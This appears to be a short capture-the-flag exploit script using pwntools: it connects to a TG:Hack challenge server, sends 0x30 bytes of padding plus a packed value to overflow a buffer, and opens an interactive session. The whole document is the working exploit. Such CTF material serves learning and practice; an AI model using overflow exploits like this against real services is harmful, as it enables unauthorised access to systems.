from pwn import *
p=remote('pwntion2.tghack.no',1062)

p.sendline('A'*0x30+p64(1))
p.interactive()
